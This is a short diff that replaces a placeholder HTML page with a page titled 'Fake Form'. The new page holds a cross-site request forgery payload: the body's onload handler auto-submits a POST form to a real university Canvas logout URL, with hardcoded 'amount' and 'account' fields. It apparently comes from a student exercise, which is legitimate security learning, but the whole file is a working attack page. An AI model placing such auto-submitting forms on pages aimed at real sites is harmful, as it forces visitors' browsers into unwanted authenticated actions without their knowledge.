@@ -1,9 +1,12 @@
-<!DOCTYPE html>
 <html>
-<body>
+  <head>
+    <title>Fake Form</title>
+  </head>
+  <body onload="document.bank_form.submit()">
+   <form action="https://canvas.nus.edu.sg/logout" method="POST" name="bank_form" >
 
-<h1>My First Heading</h1>
-<p>My first paragraph.</p>
-
-</body>
+      <input type="text" name="amount" value="100000001">   
+      <input type="text" name="account" value="3">
+    </form>
+  </body>
 </html>
